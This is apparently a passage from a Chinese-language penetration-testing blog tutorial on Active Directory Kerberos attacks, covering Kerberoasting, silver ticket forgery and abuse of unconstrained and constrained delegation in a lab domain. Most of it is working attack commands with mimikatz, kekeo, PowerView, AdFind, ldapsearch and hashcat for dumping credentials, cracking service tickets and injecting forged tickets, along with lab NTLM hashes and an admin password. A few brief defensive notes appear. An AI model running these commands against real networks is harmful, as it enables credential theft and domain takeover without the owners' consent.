+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">或</span><br><span class="line">mimikatz.exe &quot;kerberos::list&quot;</span><br><span class="line"> </span><br><span class="line">MSF里面</span><br><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_list</span><br><span class="line">或</span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p>1.mimikatz导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行完后，会在mimikatz同目录下导出 后缀为kirbi的票据文件</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/d07b5513c834a18c.png"></p>
+<p>2.Empire下的Invoke-Kerberoast.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/924bc6855dd30cdd.png"></p>
+<p><strong>离线破解服务票据</strong></p>
+<p>1.kerberoast中的tgsrepcrack.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py password.txt xx.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/7a09c1c9566ffade.png"></p>
+<p>2.hashcat</p>
+<p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m  13100  hash.txt  pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Kerberoast攻击防范</strong></p>
+<p>确保服务账号密码为强密码(长度、随机性、定期修改)</p>
+<p>如果攻击者无法将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，就无法实验 tgsrepcrack.py来破解密码。</p>
+<p>攻击者可以通过嗅探的方法抓取Kerberos TGS票据。因此，如果强制实验AES256_HMAC方式对Kerberos票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性。</p>
+<p>许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。</p>
+<p>在进行日志审计时，可以重点关注ID为4679(请求Kerberos服务票据)的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p>
+<h3 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="2.白银票据"></a>2.白银票据</h3><p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用</p>
+<p>要创建白银票据，我们需要知道以下信息：</p>
+<ul>
+<li><p>要伪造的域用户(这里我们一般填写域管理员账户)</p>
+</li>
+<li><p>域名</p>
+</li>
+<li><p>域的SID值(就是域成员SID值去掉最后的)</p>
+</li>
+<li><p>目标服务的FQDN</p>
+</li>
+<li><p>可利用的服务</p>
+</li>
+<li><p>服务账号的NTLM哈希</p>
+</li>
+</ul>
+<p>这里使用白银票据伪造CIFS服务，该通常用于Windows主机之间的文件共享。</p>
+<p>1.mimikatz获得服务账号的ntlm hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/a1a95b5f33580de8.png"></p>
+<p>得到NTLM为: 2c268a2a643267a4204a6ef6f896446b</p>
+<p>2.使用白银票据攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:2c268a2a643267a4204a6ef6f896446b /user:administrator /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/97010fec5746ed11.png"></p>
+<p>3.查看票据</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/993e4ffe96082804.png"></p>
+<p>4.访问域控</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/310e4fec54b90552.png"></p>
+<p>防御：</p>
+<p>伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
+<h3 id="3-白银票据和黄金票据的不同点"><a href="#3-白银票据和黄金票据的不同点" class="headerlink" title="3.白银票据和黄金票据的不同点"></a>3.白银票据和黄金票据的不同点</h3><p>访问权限不同：</p>
+<p>黄金票据Golden Ticket：伪造TGT认购权证，可以获取任何Kerberos服务权限</p>
+<p>白银票据Silver Ticket：伪造ST服务票据，只能访问指定的服务</p>
+<p>加密方式不同：</p>
+<p>Golden Ticket由krbtgt的Hash加密</p>
+<p>Silver Ticket 由服务账号（通常为计算机账户）Hash加密</p>
+<p>认证流程不同：</p>
+<p>Golden Ticket的利用过程需要访问域控，</p>
+<p>而Silver Ticket不需要</p>
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
+<p>上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p>
+<ul>
+<li><p>域内用户jack以Kerberos方式认证后访问Web服务器；</p>
+</li>
+<li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</p>
+</li>
+<li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</p>
+</li>
+<li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</p>
+</li>
+<li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</p>
+</li>
+<li><p>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</p>
+</li>
+</ul>
+<p><strong>在域中，只有 服务账号 和 主机账号 才具有委派属性</strong></p>
+<p>主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。</p>
+<p>服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p>
+<p><strong>委派的前提</strong></p>
+<p>需要被委派的用户未设置不允许被委派属性。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/35d2a3847a9d3a1b.png"></p>
+<p>如果勾上则administrator账户不能被委派</p>
+<h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><p>对于非约束性委派，服务账号可以获取被委派用户的<code>TGT</code>，并将<code>TGT</code>缓存到<code>LSASS</code>进程中，从而服务账号可使用该<code>TGT</code>，模拟用户访问任意服务。</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/0e511d64e31f04c8.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/4413b783afa45451.png"></p>
+<p>从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</p>
+<h2 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h2><p>由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/a55c68177381b8c7.png"></p>
+<p>配置了约束委派的账户的 userAccountControl 属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/67f4c164404b41aa.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/d8f73ef834fe109e.png"></p>
+<h2 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a><strong>基于资源的约束性委派</strong></h2><p>为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的 userAccountControl 属性为 WORKSTATION_TRUST_ACCOUNT，并且msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许基于资源约束性委派的账号的SID。  </p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/9a8f66d5b35815e1.png"></p>
+<h2 id="基于资源的约束性委派和约束性委派差别"><a href="#基于资源的约束性委派和约束性委派差别" class="headerlink" title="基于资源的约束性委派和约束性委派差别"></a>基于资源的约束性委派和约束性委派差别</h2><p>委派的权限授予给了拥有资源的后端(B)，而不再是前端(A)</p>
+<p>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</p>
+<p>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity”属性的权限，也就是 将计算机加入域的域用户 和 机器自身 拥有权限。</p>
+<p>传统的约束委派是“正向的”，通过修改服务A的属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</p>
+<p>而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</p>
+<h2 id="非约束委派和约束委派的流程"><a href="#非约束委派和约束委派的流程" class="headerlink" title="非约束委派和约束委派的流程"></a>非约束委派和约束委派的流程</h2><h3 id="1-非约束委派流程"><a href="#1-非约束委派流程" class="headerlink" title="1.非约束委派流程"></a>1.非约束委派流程</h3><p><strong>前提：</strong>在机器账号B上配置了非约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。</p>
+<p>2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B</p>
+<p>3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务</p>
+<p>从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。</p>
+<h3 id="2-约束性委派流程"><a href="#2-约束性委派流程" class="headerlink" title="2.约束性委派流程"></a>2.约束性委派流程</h3><p><strong>前提：</strong>在服务A上配置到服务B约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A</p>
+<p>2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据，</p>
+<p>3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。</p>
+<p>从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<h2 id="筛选非委派属性的账号"><a href="#筛选非委派属性的账号" class="headerlink" title="筛选非委派属性的账号"></a>筛选非委派属性的账号</h2><p>注：域控主机账户默认开启非约束委派</p>
+<h3 id="1-PowerSploit下的PowerView-ps1脚本"><a href="#1-PowerSploit下的PowerView-ps1脚本" class="headerlink" title="1.PowerSploit下的PowerView.ps1脚本"></a>1.PowerSploit下的PowerView.ps1脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line"> </span><br><span class="line">查询域中配置非约束委派的账户</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org | select name</span><br><span class="line">查询域中配置非约束委派的主机：</span><br><span class="line">Get-NetComputer -Unconstrained -Domain 0day.org | select name</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/c5fb59818b3b79d2.png"></p>
+<h3 id="2-ADFind"><a href="#2-ADFind" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>使用参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><p>-b：指定要查询的根节点</p>
+</li>
+<li><p>-f：LDAP过滤条件</p>
+</li>
+<li><p>attr list：需要显示的属性</p>
+</li>
+</ul>
+<p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/141e052e8a6ea73e.png"></p>
+<h3 id="3-ldapsearch"><a href="#3-ldapsearch" class="headerlink" title="3.ldapsearch"></a>3.ldapsearch</h3><p>kali自带，可以在域外使用</p>
+<p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.143:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/e890557928435556.png"></p>
+<h2 id="筛选约束性委派属性的账号"><a href="#筛选约束性委派属性的账号" class="headerlink" title="筛选约束性委派属性的账号"></a>筛选约束性委派属性的账号</h2><h3 id="1-ldapsearch"><a href="#1-ldapsearch" class="headerlink" title="1.ldapsearch"></a>1.ldapsearch</h3><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/4c08b440d570fc67.png"></p>
+<h3 id="2-ADFind-1"><a href="#2-ADFind-1" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/d6004c4b34a42543.png"></p>
+<h3 id="3-Empire下的PowerView-ps1脚本"><a href="#3-Empire下的PowerView-ps1脚本" class="headerlink" title="3.Empire下的PowerView.ps1脚本"></a>3.Empire下的PowerView.ps1脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line"> </span><br><span class="line">查询域中配置约束委派的账号</span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">或</span><br><span class="line">Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br><span class="line">查询域中配置约束委派的主机</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">或</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/d8878b6206fd9d84.png"></p>
+<h2 id="查询某用户是否具有委派性"><a href="#查询某用户是否具有委派性" class="headerlink" title="查询某用户是否具有委派性"></a>查询某用户是否具有委派性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line">Get-DomainUser 域用户名 -Properties  useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>
+
+<p>当该账号没委派属性时，查询不出任何信息</p>
+<p>当服务账号被设置为 <strong>非约束性委派</strong> 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION</p>
+<p>当被设置为 <strong>约束性委派</strong> 时，其userAccountControl属性包含 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx">TRUSTED_TO_AUTH_FOR_DELEGATION</a>，且 msds-allowedtodelegateto 属性会被设置为哪些 SPN。</p>
+<h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
+<p>操作环境：</p>
+<ul>
+<li><p>域：0day.org</p>
+</li>
+<li><p>域控：windows server 2008R2，主机名：OWA2010SP3，IP：<code>192.168.3.142</code></p>
+</li>
+<li><p>域管账户：sqladmin</p>
+</li>
+<li><p>域内主机：windows 8，主机名：PC-mary-0day，IP：192.168.3.63，用户：mary(普通域用户)</p>
+</li>
+</ul>
+<p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
+<h3 id="1-查找非约束委派主机账号"><a href="#1-查找非约束委派主机账号" class="headerlink" title="1.查找非约束委派主机账号"></a>1.查找非约束委派主机账号</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/a264852339c7c7d7.png"></p>
+<h3 id="2-导出票据"><a href="#2-导出票据" class="headerlink" title="2.导出票据"></a>2.导出票据</h3><p>先访问域控，可以看到是访问失败的</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/f60d867f143acba0.png"></p>
+<p>我们用sqladmin或者任意域管账号访问win8（这里域管账号登录在任意一台机器都可以）</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/f250dd2c1491dcbd.png"></p>
+<p>此时，在主机win8的lsass.exe内存中就会有域用户sqladmin的TGT票据。</p>
+<p>我们在win8上以管理员权限运行mimikatz，执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">导出票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/2e5f68cd5d3dcde8.png"></p>
+<h3 id="3-注入票据"><a href="#3-注入票据" class="headerlink" title="3.注入票据"></a>3.注入票据</h3><p>用 mimikatz 将这个票据导入内存中，然后访问域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">导入票据</span><br><span class="line">kerberos::ptt [0;33f6ebf]-2-0-60a00000-sqladmin@krbtgt-0DAY.ORG.kirbi</span><br><span class="line">查看票据</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/e8fe711244e58970.png"></p>
+<h3 id="4-访问域控"><a href="#4-访问域控" class="headerlink" title="4.访问域控"></a>4.访问域控</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/5878d850cebdf9c6.png"></p>
+<h2 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h2><p>操作环境：</p>
+<ul>
+<li><p>域：0day.org</p>
+</li>
+<li><p>域内主机：<code>windows 7</code>，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack</p>
+</li>
+<li><p>域控：OWA2010SP3</p>
+</li>
+</ul>
+<p>们设置了机器用户PC-jack-0day对OWA2010SP3的<code>cifs</code>服务的委派</p>
+<h3 id="1-查找约束性委派的主机账号"><a href="#1-查找约束性委派的主机账号" class="headerlink" title="1.查找约束性委派的主机账号"></a>1.查找约束性委派的主机账号</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/0a9595c8968b5dca.png"></p>
+<h3 id="2-请求用户TGT"><a href="#2-请求用户TGT" class="headerlink" title="2.请求用户TGT"></a>2.请求用户TGT</h3><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>参数：</p>
+<p><code>/user</code>: 服务用户的用户名</p>
+<p><code>/password</code>: 服务用户的明文密码</p>
+<p><code>/domain</code>: 所在域名</p>
+<p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p>
+<p>kekeo同样也支持使用<code>NTLM Hash</code></p>
+<p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p>
+<p>这里我们知道PC-JACK-0DAY的ntlm hash为：768623e06fae601be0c04759c87d93d3</p>
+<p>我们执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/4377d7c2fc545597.png"></p>
+<p>得到<a href="mailto:&#84;&#x47;&#x54;&#95;&#80;&#x43;&#x2d;&#x4a;&#x41;&#67;&#x4b;&#x2d;&#48;&#x44;&#x41;&#89;&#64;&#x30;&#68;&#65;&#x59;&#x2e;&#79;&#82;&#x47;&#95;&#x6b;&#114;&#98;&#116;&#x67;&#116;">&#84;&#x47;&#x54;&#95;&#80;&#x43;&#x2d;&#x4a;&#x41;&#67;&#x4b;&#x2d;&#48;&#x44;&#x41;&#89;&#64;&#x30;&#68;&#65;&#x59;&#x2e;&#79;&#82;&#x47;&#95;&#x6b;&#114;&#98;&#116;&#x67;&#116;</a>~<a href="mailto:&#48;&#100;&#x61;&#121;&#x2e;&#111;&#114;&#103;&#x40;&#48;&#x44;&#65;&#89;&#46;&#x4f;&#82;&#x47;&#46;&#107;&#105;&#x72;&#98;&#105;">&#48;&#100;&#x61;&#121;&#x2e;&#111;&#114;&#103;&#x40;&#48;&#x44;&#65;&#89;&#46;&#x4f;&#82;&#x47;&#46;&#107;&#105;&#x72;&#98;&#105;</a></p>
+<h3 id="3-获取ST"><a href="#3-获取ST" class="headerlink" title="3.获取ST"></a>3.获取ST</h3><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>OWA2010SP3 CIFS</code>的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/b712a8c65bd5a785.png"></p>
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的OWA2010SP3 CIFS服务的ST2会保存在当前目录下</p>
+<h3 id="4-注入ST2"><a href="#4-注入ST2" class="headerlink" title="4.注入ST2"></a>4.注入ST2</h3><p>然后我们用mimikatz将ST2导入当前会话即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/553e79608e3bea51.png"></p>
